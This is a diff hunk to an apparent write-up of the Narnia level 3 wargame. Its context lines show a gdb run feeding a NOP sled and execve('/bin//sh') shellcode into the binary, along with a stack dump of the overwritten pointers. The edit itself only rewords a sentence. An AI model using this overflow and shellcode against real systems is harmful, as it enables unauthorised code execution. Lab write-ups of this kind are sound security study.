@@ -88,7 +88,7 @@ Starting program: /narnia/narnia3 $(python -c 'print "\x90"*35 + "\x31\xc0\x50\x
 0xffffd680:     0x31909090      0x2f6850c0      0x6868732f      0x6e69622f  16 byte ofile 
 0xffffd690:     0x5350e389      0xc289e189      0x80cd0bb0      0xffffd660  ifd, ofd, ebp, eip
 
-now i will create a valid ofile and ifile so that the overflowed input passes all the checks.
+now i will create an ofile and ifile to match overflowed/input byte strings so that the checks are passed.
 
 ----------------------------------------------------------------------------------------------------------------------------------
 2) examining the second potential overflow @ write(ofd, buf, sizeof(buf)-1);
